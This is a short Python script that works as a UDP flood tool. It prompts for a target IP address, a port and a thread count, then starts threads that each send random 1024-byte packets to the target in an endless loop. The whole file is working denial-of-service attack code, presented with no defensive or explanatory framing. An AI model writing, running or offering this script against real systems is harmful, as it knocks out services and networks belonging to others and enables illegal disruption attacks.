import socket
import random
import threading

ip_address = input("ip_address:")
port = int(input("port:"))
thread = int(input("thread:"))

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


data = bytes(random.randint(0, 255) for _ in range(1024))

def send_data():
    while True:
        
        sock.sendto(data, (ip_address, port))


threads = []
for _ in range(thread):
    thread = threading.Thread(target=send_data)
    threads.append(thread)
    thread.start()

